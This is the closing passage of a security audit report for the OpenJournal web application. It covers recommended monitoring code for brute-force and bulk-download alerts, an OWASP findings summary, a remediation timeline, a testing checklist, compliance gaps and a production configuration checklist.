    .min(1, 'Comment cannot be empty')
    .max(2000, 'Comment too long (max 2000 characters)')
    .refine(
      (val) => val.trim().length > 0,
      'Comment cannot be only whitespace'
    ),
  parentId: z.string().cuid().optional(),
});
```

---

### 17. MISSING SECURITY MONITORING & ALERTING
**Severity:** 🟢 **LOW** (Informational)
**OWASP Category:** A09:2021 - Security Logging and Monitoring Failures
**CWE:** CWE-778

**Description:**
While audit logging is implemented (`lib/audit-log.ts`), there's no active monitoring or alerting for security events like:
- Multiple failed login attempts
- Suspicious API usage patterns
- Account takeover indicators
- Data exfiltration attempts

**Recommended Implementation:**

```typescript
// lib/security-monitoring.ts
import { createAuditLog } from './audit-log';

interface SecurityAlert {
  severity: 'low' | 'medium' | 'high' | 'critical';
  type: string;
  userId?: string;
  details: Record<string, any>;
}

export async function detectAnomalies(userId: string): Promise<SecurityAlert[]> {
  const alerts: SecurityAlert[] = [];

  // Check for multiple failed logins
  const failedLogins = await prisma.auditLog.count({
    where: {
      userId,
      action: 'auth.login.failure',
      createdAt: {
        gte: new Date(Date.now() - 15 * 60 * 1000), // Last 15 minutes
      },
    },
  });

  if (failedLogins >= 5) {
    alerts.push({
      severity: 'high',
      type: 'brute_force_attempt',
      userId,
      details: { failedAttempts: failedLogins },
    });
  }

  // Check for unusual data access patterns
  const recentDownloads = await prisma.auditLog.count({
    where: {
      userId,
      action: 'attachment.download',
      createdAt: {
        gte: new Date(Date.now() - 60 * 60 * 1000), // Last hour
      },
    },
  });

  if (recentDownloads > 50) {
    alerts.push({
      severity: 'medium',
      type: 'data_exfiltration_attempt',
      userId,
      details: { downloadCount: recentDownloads },
    });
  }

  return alerts;
}

// Integrate with notification system
export async function processSecurityAlerts() {
  // Run periodically via cron job
  const recentUsers = await prisma.auditLog.findMany({
    where: {
      createdAt: {
        gte: new Date(Date.now() - 60 * 60 * 1000),
      },
    },
    select: { userId: true },
    distinct: ['userId'],
  });

  for (const { userId } of recentUsers) {
    const alerts = await detectAnomalies(userId);

    for (const alert of alerts) {
      // Send to monitoring service (Sentry, DataDog, etc.)
      console.error('[SECURITY ALERT]', alert);

      // Create audit log
      await createAuditLog({
        userId,
        action: 'security.alert',
        resourceType: 'user',
        metadata: alert,
      });

      // Notify admins for critical alerts
      if (alert.severity === 'critical') {
        // await sendAdminAlert(alert);
      }
    }
  }
}
```

---

## Summary of Findings by OWASP Category

| OWASP Category | Count | Severity Breakdown |
|----------------|-------|-------------------|
| A01: Broken Access Control | 3 | 1 Critical, 1 High, 1 Low |
| A02: Cryptographic Failures | 2 | 1 High, 1 Medium |
| A03: Injection | 3 | 1 Critical, 1 High, 1 Low |
| A04: Insecure Design | 2 | 1 High, 1 Medium |
| A05: Security Misconfiguration | 1 | 1 Critical |
| A07: Auth Failures | 4 | 1 Critical, 2 High, 1 Medium |
| A08: Data Integrity Failures | 1 | 1 Medium |
| A09: Logging Failures | 1 | 1 Low |

---

## Remediation Priority Matrix

### Immediate (Within 1 Week)
1. **CSRF Protection** - Critical for all state-changing operations
2. **XSS Sanitization** - Prevent stored XSS in entry content
3. **Rate Limiting** - Stop brute force and DoS attacks
4. **Security Headers** - Defense in depth protection

### Short Term (Within 1 Month)
5. **2FA Secret Encryption** - Protect authentication secrets
6. **Password Strength** - Enforce strong password requirements
7. **2FA Enforcement** - Proper verification flow
8. **File Upload Security** - Content validation and safe types
9. **Access Control** - Fix IDOR in user search

### Medium Term (Within 3 Months)
10. **SQL Injection** - Replace raw queries with ORM
11. **Import Validation** - Secure deserialization
12. **BCrypt Cost** - Increase hash strength
13. **Session Management** - Implement rotation
14. **Security Monitoring** - Active threat detection

---

## Testing Recommendations

### Automated Security Testing
```bash
# Install security scanning tools
pnpm add -D @next/eslint-plugin-security
pnpm add -D eslint-plugin-security

# Add to .eslintrc.json
{
  "extends": [
    "next/core-web-vitals",
    "plugin:security/recommended"
  ]
}

# Run security scan
pnpm eslint . --ext .ts,.tsx

# Dependency vulnerability scanning (already clean)
pnpm audit

# OWASP ZAP or Burp Suite for penetration testing
```

### Manual Testing Checklist
- [ ] Test CSRF protection with Burp Suite
- [ ] Verify XSS payloads are sanitized
- [ ] Confirm rate limiting thresholds
- [ ] Validate security headers with securityheaders.com
- [ ] Test file upload with malicious files
- [ ] Attempt SQL injection on search endpoint
- [ ] Verify 2FA enforcement flow
- [ ] Test session fixation scenarios
- [ ] Check for information disclosure in errors

---

## Compliance Considerations

### GDPR (EU)
- ✅ Encryption at rest (entries and attachments)
- ✅ Audit logging for data access
- ⚠️ Need: Data retention policies
- ⚠️ Need: User data export functionality (partially implemented)
- ⚠️ Need: Right to be forgotten (account deletion)

### SOC 2
- ✅ Audit logging infrastructure
- ⚠️ Need: Security monitoring and alerting
- ⚠️ Need: Incident response procedures
- ⚠️ Need: Access review processes

### HIPAA (if handling health data)
- ✅ Encryption at rest and in transit
- ✅ Audit logging
- ⚠️ Need: Business Associate Agreements
- ⚠️ Need: Enhanced access controls
- ⚠️ Need: Automatic session timeout

---

## Security Configuration Checklist

### Production Deployment
- [ ] Set `NODE_ENV=production`
- [ ] Use strong `NEXTAUTH_SECRET` (32+ characters)
- [ ] Use strong `ENCRYPTION_KEY` (base64, 32 bytes)
- [ ] Enable HTTPS only (HSTS)
- [ ] Configure CSP headers
- [ ] Set up rate limiting (Redis/Upstash)
- [ ] Enable audit log monitoring
- [ ] Configure security alerts
- [ ] Set up automated backups
- [ ] Implement IP allowlisting for admin routes
- [ ] Enable database query logging
- [ ] Configure WAF (Web Application Firewall)

### Environment Variables Security
- [ ] Never commit .env files
- [ ] Use secret management service (AWS Secrets Manager, Vault)
- [ ] Rotate secrets quarterly
- [ ] Use different secrets per environment
- [ ] Restrict secret access to minimal personnel
- [ ] Audit secret access logs

---

## Conclusion

The OpenJournal application has a solid foundation with encryption, authentication, and audit logging. However, **critical vulnerabilities in CSRF protection, XSS sanitization, and rate limiting must be addressed immediately** before production deployment.

**Recommended Timeline:**
- **Week 1:** Implement CSRF, XSS sanitization, basic rate limiting
- **Week 2-4:** Security headers, 2FA improvements, file upload hardening
- **Month 2:** Access control fixes, monitoring, password policies
- **Month 3:** Advanced features, penetration testing, security audit

**Estimated Effort:** 80-120 hours of development work

**Next Steps:**
1. Create GitHub issues for each vulnerability
2. Prioritize critical fixes for Sprint 1
3. Schedule security code review after implementation
4. Plan penetration testing before production launch

---

**Report Generated:** 2025-11-16
**Tools Used:** Manual code review, OWASP Top 10 checklist, CWE database
**Files Analyzed:** 48 API routes, authentication system, database schema, middleware configuration
